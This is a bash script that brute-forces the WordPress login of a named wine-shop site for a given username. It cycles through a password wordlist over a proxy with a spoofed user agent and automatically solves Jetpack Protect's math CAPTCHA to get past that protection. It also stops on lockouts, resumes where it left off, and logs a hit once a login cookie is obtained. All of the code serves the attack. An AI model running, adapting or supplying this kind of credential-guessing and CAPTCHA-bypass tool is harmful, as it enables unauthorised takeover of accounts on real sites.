#!/bin/bash
export PATH=/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin:$PATH
cd /work || exit 1
eval "$(grep -m1 '^PX=' ev/tm6_wd.sh)"
export https_proxy="http://$PX"
unset http_proxy no_proxy
H=kurashiwine.com
ID=${ID:-fujiclairwine}
L=${L:-ev/pw_kw.txt}
O=${O:-ev/out/w6.txt}
S=${S:-ev/out/w6.cur}
J=ev/tmp/ckw.txt
MAXPOST=${MAXPOST:-20}
POSTS=0
UA=$(cat ev/ua.txt)
n=$'\n'

dopost() {
  if [ "$POSTS" -ge "$MAXPOST" ]; then
    printf '%s\n' "STOP_MAX	posts=$POSTS" >> "$O"
    exit 0
  fi
  POSTS=$((POSTS+1))
  raw=$(curl -s -A "$UA" -c "$J" -b "$J" --max-time 25 "$@" -w "
%{http_code}" "https://$H/wp-login.php")
  CODE=${raw##*$n}
  BODY=${raw%"$n"*}
  return 0
}

chk() {
  if [ "$CODE" = "429" ]; then
    printf '%s\n' "LOCK429	$1	code=429" >> "$O"
    exit 0
  fi
  if printf '%s' "$BODY" | grep -q '拒否されました'; then
    printf '%s\n' "LOCK429	$1	code=$CODE	body=拒否されました" >> "$O"
    exit 0
  fi
  return 0
}

start=1
if [ -s "$S" ]; then
  cur=$(cat "$S")
  ln=$(grep -n -x -F "$cur" "$L" | head -1 | cut -d: -f1)
  if [ -n "$ln" ]; then
    start=$ln
  fi
fi

while IFS= read -r w; do
  if [ -z "$w" ]; then
    continue
  fi
  case "$w" in
    '#'*) continue ;;
  esac
  printf '%s\n' "$w" > "$S"
  rm -f "$J"
  curl -s -o /dev/null -A "$UA" -c "$J" -b "$J" --max-time 15 "https://$H/wp-login.php"
  if [ ! -s "$J" ]; then
    echo "NOCK	$w" >> "$O"
    sleep 2
    continue
  fi
  dopost --data-urlencode "log=$ID" --data-urlencode "pwd=$w" --data "testcookie=1"
  chk "$w"
  if printf '%s' "$BODY" | grep -qaE '数学の問題|math problem|Prove your humanity'; then
    hash=$(printf '%s' "$BODY" | grep -o 'name="jetpack_protect_answer" value="[a-f0-9]*"' | sed -e 's,.*value=,,' -e 's,".*,,g' | head -1)
    ex=$(printf '%s' "$BODY" | awk '/for="jetpack_protect_answer"/{f=1} f&&c<2{print;c++}' | sed -e 's,<[^>]*>, ,g' -e 's,&nbsp;, ,g' -e 's,&#215;, *,g' -e 's,&times;, *,g' -e 's,×, *,g' -e 's,&#247;, /,g' -e 's,&divide;, /,g' -e 's,÷, /,g' -e 's,[[:space:]]*,,g' | grep -oE '[0-9]+[+*/-][0-9]+' | head -1)
    [ -n "$ex" ] || ex=$(printf '%s' "$BODY" | tr '\n' ' ' | grep -oE '[0-9]+(&nbsp;)?[[:space:]]*(\+|-|\*|&#215;|&times;|×|&#247;|&divide;|÷)(&nbsp;)?[[:space:]]*[0-9]+' | sed -e 's,&nbsp;, ,g' -e 's,&times;,*,g' -e 's,×,*,g' -e 's,&#215;,*,g' -e 's,&#247;,/,g' -e 's,&divide;,/,g' -e 's,÷,/,g' -e 's,[[:space:]],,g' | head -1)
    if [ -z "$hash" ] || [ -z "$ex" ]; then
      echo "NOCAP	$w" >> "$O"
      sleep 2
      continue
    fi
    a=${ex%%[!0-9]*}
    rest=${ex#"${ex%%[!0-9]*}"}
    b=${rest##*[!0-9]}
    opstr=$(printf '%s' "$rest" | grep -oE '\*/|[-+*/]' | head -1)
    if [ "$opstr" = "*/" ]; then
      opstr='*'
    fi
    if [ -z "$opstr" ]; then
      echo "NOCAP	$w	ex=$ex" >> "$O"
      sleep 2
      continue
    fi
    ans=$(( a $opstr b ))
    echo "MATH	$w	ans=$ans"
    dopost --data-urlencode "log=$ID" --data-urlencode "pwd=$w" --data "testcookie=1" --data "jetpack_protect_num=$ans" --data "jetpack_protect_answer=$hash" --data "jetpack_protect_process_math_form=1" --data-urlencode "jetpack_protect_user_login=$ID"
    chk "$w"
  fi
  if grep -q 'wordpress_logged_in' "$J"; then
    printf '%s\n' "HIT	$w" >> "$O"
    exit 0
  fi
  if printf '%s' "$BODY" | grep -q 'login_error'; then
    echo "miss	$w" >> "$O"
  else
    echo "UNK	$w	code=$CODE" >> "$O"
  fi
  sleep 2
done < <(tail -n +"$start" "$L")

printf '%s\n' "DONE	posts=$POSTS" >> "$O"
